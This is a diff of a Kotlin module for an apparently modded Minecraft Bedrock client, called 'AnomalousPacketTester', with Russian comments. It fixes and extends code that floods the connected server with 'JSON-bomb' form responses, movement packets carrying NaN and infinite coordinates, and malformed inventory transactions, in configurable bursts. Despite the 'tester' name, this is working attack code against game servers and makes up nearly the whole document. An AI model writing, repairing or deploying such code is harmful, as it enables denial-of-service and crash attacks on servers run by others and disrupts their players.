@@ -9,9 +9,11 @@ import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import org.cloudburstmc.math.vector.Vector3f
-import org.cloudburstmc.protocol.bedrock.data.inventory.InventoryActionData
-import org.cloudburstmc.protocol.bedrock.data.inventory.InventorySource
+// Правильные импорты для транзакций, которые мы уже исправили
 import org.cloudburstmc.protocol.bedrock.data.inventory.ItemData
+import org.cloudburstmc.protocol.bedrock.data.inventory.transaction.InventoryActionData
+import org.cloudburstmc.protocol.bedrock.data.inventory.transaction.InventorySource
+import org.cloudburstmc.protocol.bedrock.data.inventory.transaction.InventoryTransactionType
 import org.cloudburstmc.protocol.bedrock.packet.InventoryTransactionPacket
 import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
 import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket
@@ -28,7 +30,6 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
     private val testWithInvalidMove by boolValue("Test Invalid Movement", true)
     private val testWithInvalidInventory by boolValue("Test Invalid Inventory", true)
 
-    // <<< НОВОЕ: Настройки для контроля спама
     private val spamAmount by intValue("Spam Amount", 10, 1..100)
     private val spamDelay by intValue("Spam Delay (ms)", 20, 0..200)
 
@@ -56,18 +57,16 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
             GlobalScope.launch {
                 if (testWithJsonBomb) {
                     session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount JSON-бомб...")
-                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
                     repeat(spamAmount) {
                         sendJsonBomb(packet.formId)
                         delay(spamDelay.toLong())
                     }
                 }
 
-                delay(attackDelay.toLong()) // Задержка между разными типами атак
+                delay(attackDelay.toLong())
 
                 if (testWithInvalidMove) {
                     session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount пакетов движения...")
-                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
                     repeat(spamAmount) {
                         sendInvalidMovePacket()
                         delay(spamDelay.toLong())
@@ -78,7 +77,6 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
 
                 if (testWithInvalidInventory) {
                     session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount транзакций инвентаря...")
-                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
                     repeat(spamAmount) {
                         sendInvalidInventoryPacket()
                         delay(spamDelay.toLong())
@@ -89,7 +87,6 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
         }
     }
 
-    // Функции отправки пакетов остаются без изменений, мы просто вызываем их в цикле
     private fun sendJsonBomb(formId: Int) {
         try {
             val responsePacket = ModalFormResponsePacket()
@@ -101,17 +98,17 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
             responsePacket.setFormData(maliciousJson)
             session.serverBound(responsePacket)
         } catch (e: Exception) {
-            // Сообщения об ошибках лучше не спамить в чат, одного раза достаточно
         }
     }
 
     private fun sendInvalidMovePacket() {
         try {
             val movePacket = MovePlayerPacket()
-            movePacket.runtimeEntityId = session.localPlayer.runtimeId
-            movePacket.position = Vector3f.from(Double.NaN, 128.0, Double.POSITIVE_INFINITY)
-            movePacket.rotation = session.localPlayer.rotation
-            movePacket.mode = MovePlayerPacket.Mode.NORMAL
+            // <<< ПОБЕДА: Используем прямой доступ к свойствам, как в Kotlin
+            movePacket.setRuntimeEntityId(session.localPlayer.runtimeEntityId)
+            movePacket.setPosition(Vector3f.from(Double.NaN, 128.0, Double.POSITIVE_INFINITY))
+            movePacket.setRotation(session.localPlayer.rotation)
+            movePacket.setMode(MovePlayerPacket.Mode.NORMAL)
             session.serverBound(movePacket)
         } catch (e: Exception) {
         }
@@ -123,8 +120,8 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
             val invalidAction = InventoryActionData(
                 InventorySource.fromContainerWindowId(0), -1, ItemData.AIR, ItemData.AIR
             )
-            transactionPacket.transactionType = InventoryTransactionPacket.Type.NORMAL
-            transactionPacket.actions.add(invalidAction)
+            transactionPacket.setTransactionType(InventoryTransactionType.NORMAL)
+            transactionPacket.getActions().add(invalidAction)
             session.serverBound(transactionPacket)
         } catch (e: Exception) {
         }
